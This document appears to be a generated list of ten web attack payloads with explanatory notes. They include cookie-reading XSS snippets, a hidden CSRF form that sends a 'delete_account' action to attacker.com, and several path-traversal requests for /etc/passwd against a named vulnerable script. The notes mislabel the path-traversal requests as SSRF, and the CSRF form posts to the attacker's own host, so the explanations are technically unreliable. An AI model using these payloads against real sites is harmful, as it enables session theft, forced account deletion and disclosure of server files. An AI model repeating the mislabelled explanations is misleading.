#Attack Payloads
```python
<script>alert(document.cookie)</script>
<img src=x onerror="alert(document.cookie)">
<a href="#" onclick="alert(document.cookie)">Click me</a>
<form action="https://attacker.com/csrf" method="POST">
    <input type="hidden" name="action" value="delete_account">
    <input type="submit" value="Delete Account">
</form>
<iframe src="https://vulnerable-site.com/archive.py?filename=../../../etc/passwd" width="0" height="0"></iframe>
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://vulnerable-site.com/archive.py', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('filename=../../../etc/passwd');
</script>
<img src="https://vulnerable-site.com/archive.py?filename=../../../etc/passwd" onerror="alert(document.cookie)">
<a href="https://vulnerable-site.com/archive.py?filename=../../../etc/passwd">Download File</a>
<form action="https://vulnerable-site.com/archive.py" method="POST">
    <input type="hidden" name="filename" value="../../../etc/passwd">
    <input type="submit" value="Download File">
</form>
<script>
    fetch('https://vulnerable-site.com/archive.py?filename=../../../etc/passwd')
        .then(response => response.text())
        .then(data => console.log(data));
</script>
```

#Notes
1. The first payload is a basic Cross-Site Scripting (XSS) attack that displays the victim's cookie.
2. The second payload is another XSS attack that triggers the alert when the image fails to load.
3. The third payload is a clickable link that executes the XSS attack when clicked.
4. The fourth payload is a Cross-Site Request Forgery (CSRF) attack that attempts to delete the victim's account.
5. The fifth payload is a Server-Side Request Forgery (SSRF) attack that tries to read the `/etc/passwd` file from the server.
6. The sixth payload is another SSRF attack that uses XMLHttpRequest to read the `/etc/passwd` file.
7. The seventh payload is a combination of SSRF and XSS, where the image fails to load and triggers the XSS attack.
8. The eighth payload is a direct link to the SSRF attack, allowing the victim to download the `/etc/passwd` file.
9. The ninth payload is a form-based SSRF attack that allows the victim to download the `/etc/passwd` file.
10. The tenth payload is a fetch-based SSRF attack that logs the contents of the `/etc/passwd` file to the console.

These payloads cover a range of techniques, including XSS, CSRF, and SSRF, which are all relevant to the given context of security misconfiguration and CSRF vulnerabilities. The notes provide explanations for the rationale, exploitation technique, and potential impact of each payload.

